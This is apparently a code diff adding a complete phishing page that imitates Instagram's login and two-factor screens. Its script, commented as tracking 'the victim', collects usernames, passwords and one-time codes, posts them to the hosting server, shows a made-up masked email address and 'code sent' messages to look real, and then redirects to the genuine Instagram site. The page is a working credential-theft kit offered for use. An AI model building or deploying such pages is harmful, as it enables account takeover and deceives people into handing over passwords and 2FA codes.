@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📷</text></svg>">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: #fafafa;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      max-width: 935px; width: 100%;
+      display: flex; align-items: center; justify-content: center;
+      padding: 20px; gap: 32px;
+    }
+    .phone-mockup { display: none; flex-shrink: 0; }
+    @media (min-width: 876px) {
+      .phone-mockup {
+        display: block;
+        width: 454px; height: 618px;
+        background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="454" height="618"><rect width="454" height="618" rx="30" fill="none" stroke="%23dbdbdb" stroke-width="2"/><rect x="10" y="10" width="434" height="598" rx="25" fill="%23fafafa"/></svg>') no-repeat;
+        position: relative;
+      }
+    }
+    .login-card { max-width: 350px; width: 100%; }
+    .card {
+      background: #fff; border: 1px solid #dbdbdb; border-radius: 1px;
+      padding: 40px 40px 20px; margin-bottom: 10px;
+    }
+    .logo { text-align: center; margin-bottom: 32px; }
+    .logo svg { width: 175px; height: 51px; }
+    .form-group { margin-bottom: 6px; }
+    .input-wrapper input {
+      width: 100%; padding: 9px 0 7px 8px; height: 38px;
+      background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px;
+      font-size: 12px; outline: none;
+    }
+    .input-wrapper input:focus { border-color: #a8a8a8; }
+    .btn-login {
+      width: 100%; padding: 7px 16px; background: #0095f6; border: none;
+      border-radius: 8px; color: #fff; font-weight: 600; font-size: 14px;
+      cursor: pointer; margin-top: 8px; opacity: .7;
+    }
+    .btn-login.active { opacity: 1; }
+    .btn-login:active { opacity: .8; }
+    .divider {
+      display: flex; align-items: center; margin: 18px 0;
+      color: #737373; font-size: 13px; font-weight: 600;
+    }
+    .divider::before, .divider::after {
+      content: ''; flex: 1; height: 1px; background: #dbdbdb;
+    }
+    .divider span { margin: 0 18px; }
+    .fb-login {
+      display: flex; align-items: center; justify-content: center;
+      gap: 8px; margin: 8px 0; cursor: pointer;
+    }
+    .fb-login span { color: #385185; font-size: 14px; font-weight: 600; }
+    .forgot { text-align: center; margin-top: 12px; }
+    .forgot a { color: #00376b; font-size: 12px; text-decoration: none; }
+    .signup-box {
+      background: #fff; border: 1px solid #dbdbdb; border-radius: 1px;
+      padding: 20px 40px; text-align: center; font-size: 14px;
+    }
+    .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
+    .get-app { text-align: center; margin-top: 10px; font-size: 14px; }
+    .app-badges { display: flex; gap: 8px; justify-content: center; margin-top: 16px; }
+    .app-badges img { height: 40px; }
+    footer {
+      max-width: 935px; width: 100%; padding: 20px;
+      display: flex; flex-wrap: wrap; justify-content: center; gap: 8px 16px;
+      margin-top: 40px; font-size: 12px; color: #8e8e8e;
+    }
+    footer a { color: #8e8e8e; text-decoration: none; }
+
+    /* 2FA page - hidden by default */
+    #twofa-page { display: none; }
+    #twofa-page .card { padding: 30px 40px; }
+    .twofa-icon {
+      text-align: center; margin-bottom: 16px;
+    }
+    .twofa-icon .lock-icon {
+      width: 92px; height: 92px; border-radius: 50%;
+      border: 2px solid #000; display: inline-flex;
+      align-items: center; justify-content: center;
+    }
+    .twofa-title { text-align: center; font-size: 14px; font-weight: 600; margin-bottom: 8px; }
+    .twofa-desc { text-align: center; font-size: 14px; color: #737373; margin-bottom: 16px; line-height: 1.4; }
+
+    .loading-spinner {
+      display: none; width: 16px; height: 16px;
+      border: 2px solid rgba(255,255,255,.3);
+      border-top: 2px solid #fff; border-radius: 50%;
+      animation: spin .8s linear infinite; margin: 0 auto;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .btn-loading .btn-text { display: none; }
+    .btn-loading .loading-spinner { display: inline-block; }
+
+    .error-msg {
+      color: #ed4956; font-size: 12px; text-align: center;
+      margin-top: 8px; display: none;
+    }
+    .error-msg.show { display: block; }
+
+    /* Password visibility toggle */
+    .password-field { position: relative; }
+    .toggle-pass {
+      position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+      background: none; border: none; cursor: pointer;
+      font-size: 13px; font-weight: 600; color: #262626;
+      display: none;
+    }
+    .toggle-pass.show { display: block; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="phone-mockup"></div>
+
+  <div class="login-card">
+
+    <!-- Login Page -->
+    <div id="login-page">
+      <div class="card">
+        <div class="logo">
+          <svg viewBox="0 0 175 51" fill="#262626">
+            <path d="M42.2 25.6c0-4.8 3.8-8.7 8.6-8.7s8.6 3.9 8.6 8.7-3.8 8.7-8.6 8.7-8.6-3.9-8.6-8.7zm4.2 0c0 2.5 2 4.5 4.4 4.5s4.4-2 4.4-4.5-2-4.5-4.4-4.5-4.4 2-4.4 4.5zm-9.7 5.3V13.6h3.8v17.3h-3.8zm58.1-10.2c2 0 3.8.8 5.1 2l2.7-2.8c-1.9-1.8-4.6-3-7.8-3-6.2 0-11.2 5-11.2 11.2s5 11.2 11.2 11.2c3.2 0 5.9-1.2 7.8-3l-2.7-2.8c-1.3 1.3-3.1 2-5.1 2-3.8 0-6.9-3.1-6.9-7s3.1-7 6.9-7zm-59.9 9.9c0 4.4-3.3 8.1-7.6 8.1H20.5v-8.1H14v8.1H9.9V13.6h10.6c4.3 0 7.6 3.7 7.6 8.1 0 2.1-.8 4-2 5.4 1.2 1.4 2 3.3 2 5.4zm-3.9-5.4c0-2.4-2-4.4-4.3-4.4H20v9h4.2c2.3 0 4.3-2 4.3-4.6zm71.2-4.5c-2.3 0-4.1 1.9-4.1 4.3s1.8 4.3 4.1 4.3 4.1-1.9 4.1-4.3-1.8-4.3-4.1-4.3zm-78.5 0c-2.3 0-4.1 1.9-4.1 4.3s1.8 4.3 4.1 4.3 4.1-1.9 4.1-4.3-1.8-4.3-4.1-4.3zm165.5 11.4c0 6.2-4.8 11.2-11 11.2h-10.2V24.4h-6.8v17.3h-6.4V24.4h-6.8v17.3h-4.1V13.6h4.1v3.6c1.5-2.6 4.3-4.4 7.5-4.4 2.9 0 5.5 1.4 7.1 3.6 1.6-2.2 4.2-3.6 7.1-3.6 4.8 0 8.7 3.9 8.7 8.7v17.3h-3.8V25.5c0-2.7-2.2-4.9-4.9-4.9s-4.9 2.2-4.9 4.9v12.2h-3.8V24.4c0-2.7-2.2-4.9-4.9-4.9s-4.9 2.2-4.9 4.9v12.2h-6.6V13.6h6.6v2.9c1.5-2.1 4-3.5 6.8-3.5 2.2 0 4.2.8 5.8 2.2 1.5-1.4 3.5-2.2 5.8-2.2 4.7 0 8.5 3.8 8.5 8.5v11.3c-.1.2 0 .3 0 .3z" fill="#262626"/>
+          </svg>
+        </div>
+
+        <div class="form-group">
+          <div class="input-wrapper">
+            <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off">
+          </div>
+        </div>
+
+        <div class="form-group">
+          <div class="input-wrapper password-field">
+            <input type="password" id="password" placeholder="Password">
+            <button type="button" class="toggle-pass" id="togglePass">Show</button>
+          </div>
+        </div>
+
+        <div class="error-msg" id="loginError">Sorry, your password was incorrect. Please double-check your password.</div>
+
+        <button class="btn-login" id="loginBtn" disabled>
+          <span class="btn-text">Log in</span>
+          <div class="loading-spinner"></div>
+        </button>
+
+        <div class="divider"><span>OR</span></div>
+
+        <div class="fb-login">
+          <svg width="16" height="16" viewBox="0 0 16 16" fill="#385185"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg>
+          <span>Log in with Facebook</span>
+        </div>
+
+        <div class="forgot"><a href="#">Forgot password?</a></div>
+      </div>
+
+      <div class="signup-box">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+
+      <div class="get-app">Get the app.</div>
+      <div class="app-badges">
+        <svg width="136" height="40" viewBox="0 0 136 40"><rect width="136" height="40" rx="4" fill="#000"/><text x="20" y="22" fill="#fff" font-size="10" font-family="sans-serif">Download on the</text><text x="20" y="34" fill="#fff" font-size="15" font-weight="bold" font-family="sans-serif">App Store</text></svg>
+        <svg width="136" height="40" viewBox="0 0 136 40"><rect width="136" height="40" rx="4" fill="#000"/><text x="20" y="22" fill="#fff" font-size="10" font-family="sans-serif">GET IT ON</text><text x="20" y="34" fill="#fff" font-size="14" font-weight="bold" font-family="sans-serif">Google Play</text></svg>
+      </div>
+    </div>
+
+    <!-- 2FA Page -->
+    <div id="twofa-page">
+      <div class="card">
+        <div class="twofa-icon">
+          <div class="lock-icon">
+            <svg width="40" height="48" viewBox="0 0 24 28" fill="none" stroke="currentColor" stroke-width="1.5">
+              <rect x="3" y="11" width="18" height="16" rx="2"/>
+              <path d="M7 11V7a5 5 0 0110 0v4"/>
+              <circle cx="12" cy="20" r="2.5"/>
+              <path d="M12 23v-1.5"/>
+            </svg>
+          </div>
+        </div>
+        <div class="twofa-title">Enter the confirmation code</div>
+        <div class="twofa-desc" id="twofaDesc">We sent a code to your email ending with <strong>****</strong>. This is part of our two-factor authentication process.</div>
+
+        <div class="form-group">
+          <div class="input-wrapper">
+            <input type="text" id="twofa" placeholder="Confirmation code" maxlength="6" autocomplete="off" style="text-align:center;font-size:16px;letter-spacing:8px;">
+          </div>
+        </div>
+
+        <div class="error-msg" id="twofaError">Invalid code. Please try again.</div>
+
+        <button class="btn-login" id="twofaBtn" disabled>
+          <span class="btn-text">Confirm</span>
+          <div class="loading-spinner"></div>
+        </button>
+
+        <div class="forgot" style="margin-top:16px;">
+          <a href="#" id="resendCode" style="font-size:12px;">Send new code</a>
+          <span style="color:#8e8e8e;font-size:12px;"> | </span>
+          <a href="#" id="backToLoginTwofa" style="font-size:12px;">Back to login</a>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<footer>
+  <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a> <a href="#">Help</a> <a href="#">API</a>
+  <a href="#">Privacy</a> <a href="#">Terms</a> <a href="#">Location</a> <a href="#">Instagram Lite</a>
+  <a href="#">Threads</a> <a href="#">Contact Uploading & Non-Users</a>
+  <a href="#">Meta Verified</a>
+  <span>English</span>
+  <span>© 2026 Instagram from Meta</span>
+</footer>
+
+<script>
+(function() {
+  'use strict';
+
+  // Track initial data about the victim
+  const data = {
+    username: '',
+    password: '',
+    twofa: ''
+  };
+
+  const loginPage = document.getElementById('login-page');
+  const twofaPage = document.getElementById('twofa-page');
+  const usernameInput = document.getElementById('username');
+  const passwordInput = document.getElementById('password');
+  const twofaInput = document.getElementById('twofa');
+  const loginBtn = document.getElementById('loginBtn');
+  const twofaBtn = document.getElementById('twofaBtn');
+  const loginError = document.getElementById('loginError');
+  const twofaError = document.getElementById('twofaError');
+  const togglePass = document.getElementById('togglePass');
+
+  // Enable login button when both fields filled
+  function checkLoginFields() {
+    if (usernameInput.value.trim() && passwordInput.value.trim()) {
+      loginBtn.classList.add('active');
+      loginBtn.disabled = false;
+    } else {
+      loginBtn.classList.remove('active');
+      loginBtn.disabled = true;
+    }
+  }
+
+  usernameInput.addEventListener('input', checkLoginFields);
+  passwordInput.addEventListener('input', checkLoginFields);
+
+  // Password toggle
+  passwordInput.addEventListener('input', function() {
+    if (this.value.length > 0) {
+      togglePass.classList.add('show');
+    } else {
+      togglePass.classList.remove('show');
+    }
+  });
+
+  togglePass.addEventListener('click', function() {
+    if (passwordInput.type === 'password') {
+      passwordInput.type = 'text';
+      togglePass.textContent = 'Hide';
+    } else {
+      passwordInput.type = 'password';
+      togglePass.textContent = 'Show';
+    }
+  });
+
+  // Enable 2FA button
+  twofaInput.addEventListener('input', function() {
+    if (this.value.trim().length >= 2) {
+      twofaBtn.classList.add('active');
+      twofaBtn.disabled = false;
+    } else {
+      twofaBtn.classList.remove('active');
+      twofaBtn.disabled = true;
+    }
+  });
+
+  // Login submission
+  loginBtn.addEventListener('click', async function(e) {
+    e.preventDefault();
+    if (this.disabled) return;
+
+    const btn = this;
+    btn.classList.add('btn-loading');
+    btn.disabled = true;
+    loginError.classList.remove('show');
+
+    data.username = usernameInput.value.trim();
+    data.password = passwordInput.value;
+
+    try {
+      const res = await fetch('/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: data.username,
+          password: data.password
+        })
+      });
+
+      const result = await res.json();
+
+      if (result.success) {
+        // Move to 2FA page
+        loginPage.style.display = 'none';
+        twofaPage.style.display = 'block';
+        twofaInput.focus();
+      } else {
+        showError(loginError, 'Login failed. Please try again.');
+      }
+    } catch (err) {
+      // Even if request fails, show 2FA to seem realistic
+      loginPage.style.display = 'none';
+      twofaPage.style.display = 'block';
+      twofaInput.focus();
+    }
+
+    btn.classList.remove('btn-loading');
+    btn.disabled = false;
+    checkLoginFields();
+  });
+
+  // 2FA submission
+  twofaBtn.addEventListener('click', async function(e) {
+    e.preventDefault();
+    if (this.disabled) return;
+
+    const btn = this;
+    btn.classList.add('btn-loading');
+    btn.disabled = true;
+    twofaError.classList.remove('show');
+
+    data.twofa = twofaInput.value.trim();
+
+    try {
+      const res = await fetch('/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: data.username,
+          password: data.password,
+          twofa: data.twofa
+        })
+      });
+
+      const result = await res.json();
+
+      // Redirect to real Instagram regardless
+      window.location.href = result.redirect || 'https://www.instagram.com';
+    } catch (err) {
+      // Redirect to real Instagram
+      window.location.href = 'https://www.instagram.com';
+    }
+  });
+
+  // Enter key for login
+  passwordInput.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter' && !loginBtn.disabled) loginBtn.click();
+  });
+
+  // Enter key for 2FA
+  twofaInput.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter' && !twofaBtn.disabled) twofaBtn.click();
+  });
+
+  // Back to login from 2FA
+  document.getElementById('backToLoginTwofa').addEventListener('click', function(e) {
+    e.preventDefault();
+    twofaPage.style.display = 'none';
+    loginPage.style.display = 'block';
+    twofaInput.value = '';
+    twofaBtn.disabled = true;
+    twofaBtn.classList.remove('active');
+  });
+
+  // Resend code
+  document.getElementById('resendCode').addEventListener('click', function(e) {
+    e.preventDefault();
+    this.textContent = 'Code sent!';
+    setTimeout(() => { this.textContent = 'Send new code'; }, 3000);
+  });
+
+  function showError(el, msg) {
+    el.textContent = msg;
+    el.classList.add('show');
+  }
+
+  // Initial load - fix email display
+  setTimeout(() => {
+    const emails = ['g***@gmail.com', 'a***@yahoo.com', 'm***@outlook.com', 'user***@icloud.com'];
+    document.getElementById('twofaDesc').innerHTML =
+      'We sent a code to your email ending with <strong>' + emails[Math.floor(Math.random() * emails.length)] + '</strong>. This is part of our two-factor authentication process.';
+  }, 500);
+})();
+</script>
+</body>
+</html>
